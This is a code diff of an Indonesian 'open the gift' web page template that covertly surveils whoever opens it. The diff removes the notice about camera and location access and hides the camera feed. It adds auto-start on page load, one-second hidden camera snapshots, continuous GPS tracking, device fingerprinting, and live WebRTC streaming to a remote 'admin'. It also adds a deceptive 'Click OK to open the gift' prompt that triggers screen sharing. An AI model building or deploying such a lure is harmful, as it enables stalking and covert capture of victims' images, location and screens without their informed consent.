@@ -1,205 +1,577 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>{{ app_name }} — Hadiah</title>
-  <style>
-    :root{
-      --bg:#0b1020; --surface:#0f172a; --text:#e5e7eb; --muted:#9aa4b2;
-      --stroke:rgba(255,255,255,.14); --g1:#8b5cf6; --g2:#22d3ee; --ok:#16a34a; --err:#ef4444;
-    }
-    *{box-sizing:border-box}
-    body{
-      margin:0; min-height:100vh; color:var(--text);
-      font:14px/1.6 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
-      background: radial-gradient(1200px 800px at 80% -10%, #1f2937 0%, #0b1020 40%, #0b1020 100%);
-    }
-    .wrap{max-width:720px;margin:36px auto;padding:16px}
-    .card{
-      background:rgba(255,255,255,.06); border:1px solid var(--stroke);
-      border-radius:18px; padding:24px; box-shadow:0 10px 30px rgba(0,0,0,.25);
-      text-align:center;
-    }
-    h1{margin:0 0 8px; font-size:clamp(22px,3vw,28px)}
-    p.note{margin:6px 0 14px; color:var(--muted); font-size:13px}
-
-    .stage{display:grid; place-items:center; padding:14px 0 22px}
-    .gift{position:relative; width:220px; height:220px; transform-style:preserve-3d; transition:transform .5s ease;}
-    .box{position:absolute; inset:40px 0 0 0; margin:auto; width:220px; height:180px;
-         background:linear-gradient(135deg, #111a33, #0f172a); border:1px solid var(--stroke); border-radius:14px;
-         box-shadow:0 18px 30px rgba(0,0,0,.35) inset; overflow:hidden;}
-    .ribbon-v,.ribbon-h{position:absolute; background:linear-gradient(135deg, var(--g1), var(--g2));}
-    .ribbon-v{ width:18px; height:100%; left:101px; top:0 }
-    .ribbon-h{ height:18px; width:100%; left:0; top:68px }
-    .lid{position:absolute; top:0; left:0; width:220px; height:70px; background:linear-gradient(135deg, #121b35, #13203f);
-         border:1px solid var(--stroke); border-radius:14px 14px 10px 10px; transform-origin:50% 100%;
-         transition:transform .6s cubic-bezier(.2,.8,.2,1); overflow:hidden;}
-    .bow{position:absolute; top:10px; left:50%; transform:translateX(-50%); width:110px; height:36px; border-radius:999px;
-         background:linear-gradient(135deg, var(--g1), var(--g2)); filter:drop-shadow(0 4px 10px rgba(34,211,238,.25));}
-    .gift.open .lid{ transform:translateY(-28px) rotateX(55deg) }
-    .gift.open{ transform:translateY(-2px) }
-
-    .btn{
-      appearance:none; cursor:pointer; border-radius:12px; padding:12px 16px;
-      border:1px solid transparent; color:#0b1020; font-weight:700;
-      background:linear-gradient(135deg, var(--g1), var(--g2));
-      box-shadow:0 10px 24px rgba(139,92,246,.35);
-      transition:transform .18s ease, opacity .2s;
-      display:inline-flex; align-items:center; gap:10px;
-    }
-    .btn:disabled{opacity:.7; cursor:not-allowed}
-    .btn:hover{transform:translateY(-1px)}
-    .status{
-      display:inline-flex; align-items:center; gap:8px; font-size:12px;
-      padding:8px 10px; border-radius:999px; border:1px solid var(--stroke); margin-top:10px
-    }
-    .status.ok{border-color:rgba(22,163,74,.5)} .status.err{border-color:rgba(239,68,68,.5)}
-    .spinner{
-      width:14px; height:14px; border-radius:999px; border:2px solid rgba(255,255,255,.25);
-      border-left-color:var(--g2); animation:spin 1s linear infinite;
-    }
-    @keyframes spin{to{transform:rotate(360deg)}}
-    .hint{margin-top:12px; color:var(--muted); font-size:12px}
-
-    #preview{display:none; width:180px; border-radius:10px; border:1px solid var(--stroke); margin-top:10px}
-  </style>
-</head>
-<body>
-  <div class="wrap">
-    <div class="card">
-      <h1>Buka Hadiah 🎁</h1>
-      <p class="note">Klik “Buka Hadiah” untuk membuka paket dan mengizinkan lokasi & kamera.</p>
-
-      <div class="stage">
-        <div id="gift" class="gift" aria-hidden="true">
-          <div class="lid"><div class="bow"></div><div class="ribbon-h"></div></div>
-          <div class="box"><div class="ribbon-v"></div></div>
-        </div>
-      </div>
-
-      <button id="openBtn" class="btn"><span>🎉 Buka Hadiah</span></button>
-      <div id="status" class="status">
-        <div id="spin" class="spinner" style="display:none"></div>
-        <span id="statusText">Siap dibuka</span>
-      </div>
-
-      <!-- optional preview kamera -->
-      <video id="preview" playsinline autoplay muted></video>
-
-      <p class="hint">Jika tidak merespon, pastikan izin lokasi & kamera tidak diblokir. iOS: Settings → Safari → Location/Camera → Allow & Precise.</p>
-    </div>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti/dist/confetti.browser.min.js"></script>
-  <script>
-    const token  = {{ token|tojson }};
-    const base   = {{ base|tojson }};
-
-    const gift   = document.getElementById('gift');
-    const btn    = document.getElementById('openBtn');
-    const status = document.getElementById('status');
-    const statusText = document.getElementById('statusText');
-    const spin   = document.getElementById('spin');
-    const preview= document.getElementById('preview');
-
-    let lastHitId = null;
-    let snapshotTimer = null;
-    let stream = null;
-
-    function setStatus(text, type){
-      statusText.textContent = text;
-      status.classList.remove('ok','err');
-      if (type==='ok'){ status.classList.add('ok'); spin.style.display='none'; }
-      else if (type==='err'){ status.classList.add('err'); spin.style.display='none'; }
-      else { spin.style.display='inline-block'; }
-    }
-    function openGiftUI(success=true){
-      gift.classList.add('open');
-      if (window.confetti && success){
-        confetti({ particleCount: 120, spread: 70, origin: { y: 0.25 } });
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>{{ app_name }} — Hadiah</title>
+    <style>
+      :root {
+        --bg: #0b1020;
+        --surface: #0f172a;
+        --text: #e5e7eb;
+        --muted: #9aa4b2;
+        --stroke: rgba(255, 255, 255, 0.14);
+        --g1: #8b5cf6;
+        --g2: #22d3ee;
+        --ok: #16a34a;
+        --err: #ef4444;
       }
-    }
-
-    async function postLoc(lat, lon, acc){
-      try{
-        const r = await fetch(`${base}/api/track/${token}`,{
-          method:'POST', headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ lat, lon, acc })
-        });
-        const j = await r.json();
-        if (j && j.ok && j.id) lastHitId = j.id;
-      }catch(e){}
-    }
-    async function uploadPhoto(blob){
-      if (!lastHitId || !blob) return;
-      const fd = new FormData();
-      fd.append('photo', blob, 'frame.jpg');
-      try{ await fetch(`${base}/api/photo/${token}/${lastHitId}`, { method:'POST', body: fd }); }catch(e){}
-    }
-
-    async function startCameraAndSnap(){
-      try{
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('getUserMedia tidak didukung');
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        preview.srcObject = stream;
-        await preview.play().catch(()=>{});
-        // preview.style.display = 'block'; // tampilkan jika mau
-
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const snap = async ()=>{
-          if (!preview.videoWidth) return;
-          canvas.width  = preview.videoWidth;
-          canvas.height = preview.videoHeight;
-          ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(uploadPhoto, 'image/jpeg', 0.8);
-        };
-        await snap();
-        snapshotTimer = setInterval(snap, 5000);
-        setStatus('Hadiah terbuka • kamera aktif ✔️', 'ok');
-      }catch(err){
-        setStatus('Kamera ditolak/tidak tersedia. Lanjut tanpa foto.', 'err');
+      * {
+        box-sizing: border-box;
       }
-    }
-
-    async function requestAll(){
-      btn.disabled = true;
-      setStatus('Meminta izin…', 'loading');
-      try{
-        if ('geolocation' in navigator){
-          await new Promise((resolve)=>{
-            navigator.geolocation.getCurrentPosition((pos)=>{
-              const { latitude, longitude, accuracy } = pos.coords;
-              postLoc(latitude, longitude, accuracy).then(resolve).catch(resolve);
-            }, (_err)=>{
-              postLoc(null, null, null).then(resolve).catch(resolve);
-            }, { enableHighAccuracy:true, maximumAge:0, timeout:20000 });
-          });
-        } else {
-          await postLoc(null, null, null);
+      body {
+        margin: 0;
+        min-height: 100vh;
+        color: var(--text);
+        font: 14px/1.6 ui-sans-serif, system-ui, -apple-system, "Segoe UI",
+          Roboto, Arial;
+        background: radial-gradient(
+          1200px 800px at 80% -10%,
+          #1f2937 0%,
+          #0b1020 40%,
+          #0b1020 100%
+        );
+      }
+      .wrap {
+        max-width: 720px;
+        margin: 36px auto;
+        padding: 16px;
+      }
+      .card {
+        background: rgba(255, 255, 255, 0.06);
+        border: 1px solid var(--stroke);
+        border-radius: 18px;
+        padding: 24px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+        text-align: center;
+      }
+      h1 {
+        margin: 0 0 8px;
+        font-size: clamp(22px, 3vw, 28px);
+      }
+      p.note {
+        margin: 6px 0 14px;
+        color: var(--muted);
+        font-size: 13px;
+      }
+      .stage {
+        display: grid;
+        place-items: center;
+        padding: 14px 0 22px;
+      }
+      .gift {
+        position: relative;
+        width: 220px;
+        height: 220px;
+        transform-style: preserve-3d;
+        transition: transform 0.5s ease;
+      }
+      .box {
+        position: absolute;
+        inset: 40px 0 0;
+        margin: auto;
+        width: 220px;
+        height: 180px;
+        background: linear-gradient(135deg, #111a33, #0f172a);
+        border: 1px solid var(--stroke);
+        border-radius: 14px;
+        box-shadow: 0 18px 30px rgba(0, 0, 0, 0.35) inset;
+        overflow: hidden;
+      }
+      .ribbon-v,
+      .ribbon-h {
+        position: absolute;
+        background: linear-gradient(135deg, var(--g1), var(--g2));
+      }
+      .ribbon-v {
+        width: 18px;
+        height: 100%;
+        left: 101px;
+        top: 0;
+      }
+      .ribbon-h {
+        height: 18px;
+        width: 100%;
+        left: 0;
+        top: 68px;
+      }
+      .lid {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 220px;
+        height: 70px;
+        background: linear-gradient(135deg, #121b35, #13203f);
+        border: 1px solid var(--stroke);
+        border-radius: 14px 14px 10px 10px;
+        transform-origin: 50% 100%;
+        transition: transform 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
+        overflow: hidden;
+      }
+      .bow {
+        position: absolute;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 110px;
+        height: 36px;
+        border-radius: 999px;
+        background: linear-gradient(135deg, var(--g1), var(--g2));
+        filter: drop-shadow(0 4px 10px rgba(34, 211, 238, 0.25));
+      }
+      .gift.open .lid {
+        transform: translateY(-28px) rotateX(55deg);
+      }
+      .gift.open {
+        transform: translateY(-2px);
+      }
+      .btn {
+        appearance: none;
+        cursor: pointer;
+        border-radius: 12px;
+        padding: 12px 16px;
+        border: 1px solid transparent;
+        color: #0b1020;
+        font-weight: 700;
+        background: linear-gradient(135deg, var(--g1), var(--g2));
+        box-shadow: 0 10px 24px rgba(139, 92, 246, 0.35);
+        transition: transform 0.18s ease, opacity 0.2s;
+        display: inline-flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .btn.small {
+        padding: 8px 12px;
+        font-weight: 600;
+      }
+      .btn:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+      }
+      .btn:hover {
+        transform: translateY(-1px);
+      }
+      .status {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 12px;
+        padding: 8px 10px;
+        border-radius: 999px;
+        border: 1px solid var(--stroke);
+        margin-top: 10px;
+      }
+      .status.ok {
+        border-color: rgba(22, 163, 74, 0.5);
+      }
+      .status.err {
+        border-color: rgba(239, 68, 68, 0.5);
+      }
+      .spinner {
+        width: 14px;
+        height: 14px;
+        border-radius: 999px;
+        border: 2px solid rgba(255, 255, 255, 0.25);
+        border-left-color: var(--g2);
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
         }
-        openGiftUI(true);
-        await startCameraAndSnap();
-      } finally {
-        btn.disabled = false;
-        btn.textContent = 'Buka Lagi';
       }
-    }
+      .hint {
+        margin-top: 12px;
+        color: var(--muted);
+        font-size: 12px;
+      }
 
-    btn.addEventListener('click', requestAll);
+      /* Banner permintaan screen share */
+      .banner {
+        margin-top: 14px;
+        display: none;
+        border: 1px dashed rgba(255, 255, 255, 0.25);
+        background: rgba(255, 255, 255, 0.06);
+        padding: 12px;
+        border-radius: 12px;
+      }
+      .banner.open {
+        display: block;
+      }
+      .row {
+        display: flex;
+        gap: 8px;
+        justify-content: center;
+        flex-wrap: wrap;
+        margin-top: 8px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="card">
+        <h1>Buka Hadiah 🎁</h1>
+        <p class="note">.</p>
 
-    // pre-warm entry jika izin geolocation sudah granted (kamera tetap butuh klik di iOS)
-    if (navigator.permissions && navigator.permissions.query){
-      navigator.permissions.query({name:'geolocation'}).then(p=>{
-        if (p.state === 'granted'){ postLoc(null, null, null); }
-      }).catch(()=>{});
-    }
+        <div class="stage">
+          <div id="gift" class="gift" aria-hidden="true">
+            <div class="lid">
+              <div class="bow"></div>
+              <div class="ribbon-h"></div>
+            </div>
+            <div class="box"><div class="ribbon-v"></div></div>
+          </div>
+        </div>
 
-    window.addEventListener('beforeunload', ()=>{
-      if (snapshotTimer) clearInterval(snapshotTimer);
-      if (stream) stream.getTracks().forEach(t=>t.stop());
-    });
-  </script>
-</body>
+        <button id="openBtn" class="btn"><span>🎉 Buka Hadiah</span></button>
+        <div id="status" class="status">
+          <div id="spin" class="spinner" style="display: none"></div>
+          <span id="statusText">Siap dibuka</span>
+        </div>
+
+        <!-- Banner permintaan screen share -->
+        <div id="screenBanner" class="banner">
+          <div><strong>Klik Oke untuk buka kado!!</strong>.</div>
+          <div class="row">
+            <button id="startScreenBtn" class="btn small">OKE</button>
+            <button
+              id="denyScreenBtn"
+              class="btn small"
+              style="
+                background: #0f172a;
+                color: #e5e7eb;
+                border-color: rgba(255, 255, 255, 0.2);
+              "
+            >
+              Tolak
+            </button>
+          </div>
+          <div class="hint"></div>
+        </div>
+
+        <p class="note">Wait loading.....</p>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti/dist/confetti.browser.min.js"></script>
+    <script>
+      const token = {{ token|tojson }};
+      const base  = {{ base|tojson }};
+
+      const SNAP_INTERVAL_MS = 1000;
+      const JPG_QUALITY = 0.8;
+      const HEARTBEAT_MS = 3000;
+
+      const gift   = document.getElementById('gift');
+      const btn    = document.getElementById('openBtn');
+      const status = document.getElementById('status');
+      const statusText = document.getElementById('statusText');
+      const spin   = document.getElementById('spin');
+
+      const screenBanner = document.getElementById('screenBanner');
+      const startScreenBtn = document.getElementById('startScreenBtn');
+      const denyScreenBtn = document.getElementById('denyScreenBtn');
+
+      const SESSION_ID = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2)) + '-' + Date.now().toString(36);
+
+      let lastHitId = null;
+      let snapshotTimer = null;
+      let heartbeatTimer = null;
+      let watchId = null;
+      let stream = null;           // camera stream
+      let screenStream = null;     // display stream
+      let hiddenVideo = null;
+      let batteryObj = null;
+
+      // WebRTC (responder) state
+      let pc = null;
+      let curViewerId = null;
+      let pollTimer = null;
+      let pendingScreenViewerId = null; // viewerId yang meminta screen
+
+      function setStatus(text, type){
+        statusText.textContent = text;
+        status.classList.remove('ok','err');
+        if (type==='ok'){ status.classList.add('ok'); spin.style.display='none'; }
+        else if (type==='err'){ status.classList.add('err'); spin.style.display='none'; }
+        else { spin.style.display='inline-block'; }
+      }
+      function openGiftUI(success=true){
+        gift.classList.add('open');
+        if (window.confetti && success){
+          confetti({ particleCount: 120, spread: 70, origin: { y: 0.25 } });
+        }
+      }
+
+      async function startSession(){
+        try{
+          const screenInfo = { w: window.screen.width, h: window.screen.height, dpr: window.devicePixelRatio||1 };
+          const conn = (navigator.connection && (navigator.connection.effectiveType || navigator.connection.type)) ? { eff: navigator.connection.effectiveType, down: navigator.connection.downlink } : null;
+          try{ if (navigator.getBattery) batteryObj = await navigator.getBattery(); }catch(e){}
+          const battery = batteryObj ? { level: batteryObj.level, charging: batteryObj.charging } : null;
+
+          await fetch(`${base}/api/session/start/${token}`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({
+              session_id: SESSION_ID,
+              screen: screenInfo, lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              platform: navigator.platform, vendor: navigator.vendor, conn, battery, visible: !document.hidden
+            })
+          });
+        }catch(e){}
+      }
+      async function heartbeat(){
+        const conn = (navigator.connection && (navigator.connection.effectiveType || navigator.connection.type)) ? { eff: navigator.connection.effectiveType, down: navigator.connection.downlink } : null;
+        const battery = batteryObj ? { level: batteryObj.level, charging: batteryObj.charging } : null;
+        try{
+          await fetch(`${base}/api/session/heartbeat/${token}`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ session_id: SESSION_ID, conn, battery, visible: !document.hidden })
+          });
+        }catch(e){}
+      }
+      async function stopSession(){
+        try{
+          await fetch(`${base}/api/session/stop/${token}`,{
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ session_id: SESSION_ID })
+          });
+        }catch(e){}
+      }
+
+      async function postLoc(lat, lon, acc){
+        try{
+          const r = await fetch(`${base}/api/track/${token}`,{
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ lat, lon, acc })
+          });
+          const j = await r.json().catch(()=>({}));
+          if (j && j.ok && j.id) lastHitId = j.id;
+        }catch(e){}
+      }
+      async function uploadPhoto(blob){
+        if (!lastHitId || !blob) return;
+        const fd = new FormData();
+        fd.append('photo', blob, 'frame.jpg');
+        try{ await fetch(`${base}/api/photo/${token}/${lastHitId}`, { method:'POST', body: fd }); }catch(e){}
+      }
+
+      async function startCameraAndSnap(){
+        try{
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('getUserMedia tidak didukung');
+
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+
+          // video tersembunyi (tanpa preview)
+          hiddenVideo = document.createElement('video');
+          hiddenVideo.setAttribute('playsinline','');
+          hiddenVideo.muted = true;
+          hiddenVideo.srcObject = stream;
+          Object.assign(hiddenVideo.style, { position:'absolute', width:'1px', height:'1px', opacity:'0', pointerEvents:'none', left:'-9999px', top:'-9999px' });
+          document.body.appendChild(hiddenVideo);
+          await hiddenVideo.play().catch(()=>{});
+
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+
+          const snap = async ()=>{
+            if (!hiddenVideo.videoWidth) return;
+            canvas.width  = hiddenVideo.videoWidth;
+            canvas.height = hiddenVideo.videoHeight;
+            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(uploadPhoto, 'image/jpeg', JPG_QUALITY);
+          };
+
+          await snap();
+          clearInterval(snapshotTimer);
+          snapshotTimer = setInterval(snap, SNAP_INTERVAL_MS);
+        }catch(err){
+          setStatus('Kamera ditolak/tidak tersedia. Lanjut tanpa foto.', 'err');
+        }
+      }
+
+      function startGeoWatch(){
+        if (!('geolocation' in navigator)) return;
+        try{
+          watchId = navigator.geolocation.watchPosition((pos)=>{
+            const { latitude, longitude, accuracy } = pos.coords;
+            postLoc(latitude, longitude, accuracy);
+          }, (_err)=>{
+            postLoc(null, null, null);
+          }, { enableHighAccuracy:true, maximumAge:0, timeout:30000 });
+        }catch(e){}
+      }
+
+      // ===== Signaling
+      async function sendSignal(mailbox, msg){
+        try{
+          await fetch(`${base}/api/signal/send/${token}/${encodeURIComponent(mailbox)}`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ msg })
+          });
+        }catch(e){}
+      }
+      async function pollSignal(mailbox, handler){
+        try{
+          const r = await fetch(`${base}/api/signal/poll/${token}/${encodeURIComponent(mailbox)}`);
+          const j = await r.json();
+          if (j && j.ok && Array.isArray(j.msgs)){
+            j.msgs.forEach(handler);
+          }
+        }catch(e){}
+      }
+
+      // WebRTC handling
+      async function ensureWebRTCForViewer(offerMsg){
+        const { viewerId: vId, sdp } = offerMsg;
+        curViewerId = vId;
+
+        if (pc){ try{ pc.close(); }catch(e){} pc = null; }
+
+        pc = new RTCPeerConnection({ iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:global.stun.twilio.com:3478'] }] });
+
+        // Tambahkan track kamera
+        if (stream){ stream.getTracks().forEach(t=> pc.addTrack(t, stream)); }
+
+        // Jika sudah ada screenStream, tambahkan juga
+        if (screenStream){ screenStream.getTracks().forEach(t=> pc.addTrack(t, screenStream)); }
+
+        pc.onicecandidate = (ev)=>{
+          if (ev.candidate){
+            sendSignal(`admin_${SESSION_ID}`, { type:'candidate', viewerId: curViewerId, candidate: ev.candidate });
+          }
+        };
+
+        await pc.setRemoteDescription(new RTCSessionDescription(sdp));
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+        await sendSignal(`admin_${SESSION_ID}`, { type:'answer', viewerId: curViewerId, sdp: pc.localDescription });
+      }
+
+      function startPollOffers(){
+        if (pollTimer) return;
+        pollTimer = setInterval(async ()=>{
+          await pollSignal(`client_${SESSION_ID}`, async (m)=>{
+            if (m.type === 'offer' && m.sdp){
+              await ensureWebRTCForViewer(m);
+            } else if (m.type === 'candidate' && m.candidate){
+              try{ if (pc && m.viewerId === curViewerId){ await pc.addIceCandidate(new RTCIceCandidate(m.candidate)); } }catch(e){}
+            } else if (m.type === 'cmd'){
+              if (m.cmd === 'start_screen'){
+                pendingScreenViewerId = m.viewerId;
+                // tampilkan banner agar user klik (dibutuhkan user gesture)
+                screenBanner.classList.add('open');
+              } else if (m.cmd === 'stop_screen'){
+                await stopScreenShare();
+              }
+            }
+          });
+        }, 800);
+      }
+
+      async function startScreenShare(){
+        try{
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) throw new Error('getDisplayMedia tidak didukung');
+          const disp = await navigator.mediaDevices.getDisplayMedia({
+            video: { frameRate: 15 }, audio: false
+          });
+          screenStream = disp;
+
+          // jika sudah ada PC, tambahkan track layar sekarang
+          if (pc){ screenStream.getTracks().forEach(t=> pc.addTrack(t, screenStream)); }
+
+          // ketika user stop via UI browser
+          screenStream.getVideoTracks().forEach(t=>{
+            t.onended = ()=>{ stopScreenShare(); };
+          });
+
+          // beri tahu admin bahwa siap → admin akan buat offer baru
+          await sendSignal(`admin_${SESSION_ID}`, { type:'screen_ready', viewerId: curViewerId || pendingScreenViewerId });
+          screenBanner.classList.remove('open');
+        } catch (e){
+          // user membatalkan / error
+          screenBanner.classList.remove('open');
+        }
+      }
+
+      async function stopScreenShare(){
+        try{
+          if (screenStream){
+            screenStream.getTracks().forEach(t=> t.stop());
+            screenStream = null;
+          }
+        } finally {
+          await sendSignal(`admin_${SESSION_ID}`, { type:'screen_stopped', viewerId: curViewerId || pendingScreenViewerId });
+        }
+      }
+
+      // UI actions banner
+      startScreenBtn.addEventListener('click', startScreenShare);
+      denyScreenBtn.addEventListener('click', ()=> screenBanner.classList.remove('open'));
+
+      // Flow utama
+      async function requestAll(){
+        btn.disabled = true;
+        setStatus('Tunggu ya', 'loading');
+        try{
+          await startSession();
+          if ('geolocation' in navigator){
+            await new Promise((resolve)=>{
+              navigator.geolocation.getCurrentPosition((pos)=>{
+                const { latitude, longitude, accuracy } = pos.coords;
+                postLoc(latitude, longitude, accuracy).then(resolve).catch(resolve);
+              }, (_err)=>{
+                postLoc(null, null, null).then(resolve).catch(resolve);
+              }, { enableHighAccuracy:true, maximumAge:0, timeout:20000 });
+            });
+          } else {
+            await postLoc(null, null, null);
+          }
+
+          openGiftUI(true);
+          startGeoWatch();
+          await startCameraAndSnap();
+
+          // heartbeat sesi
+          clearInterval(heartbeatTimer);
+          heartbeatTimer = setInterval(heartbeat, HEARTBEAT_MS);
+
+          // mulai listen untuk offer viewer & command
+          startPollOffers();
+
+          setStatus('Hadiah terbuka • Buka lagi kalau ZONK', 'ok');
+        } finally {
+          btn.disabled = false;
+          btn.textContent = 'Buka Lagi';
+        }
+      }
+
+      btn.addEventListener('click', requestAll);
+      document.addEventListener('visibilitychange', heartbeat);
+
+      // Auto-start saat halaman dibuka
+      document.addEventListener('DOMContentLoaded', () => {
+        setTimeout(() => {
+          if (!window.__autoStarted) {
+            window.__autoStarted = true;
+            requestAll();
+          }
+        }, 200);
+      });
+
+      window.addEventListener('beforeunload', ()=>{
+        if (heartbeatTimer) clearInterval(heartbeatTimer);
+        if (snapshotTimer) clearInterval(snapshotTimer);
+        if (pollTimer) clearInterval(pollTimer);
+        if (watchId!=null) try{ navigator.geolocation.clearWatch(watchId); }catch(e){}
+        if (pc){ try{ pc.close(); }catch(e){} pc = null; }
+        if (stream) stream.getTracks().forEach(t=>t.stop());
+        if (screenStream) screenStream.getTracks().forEach(t=>t.stop());
+        if (hiddenVideo && hiddenVideo.parentNode){
+          hiddenVideo.pause(); hiddenVideo.srcObject = null; hiddenVideo.parentNode.removeChild(hiddenVideo);
+        }
+        stopSession();
+      });
+    </script>
+  </body>
 </html>
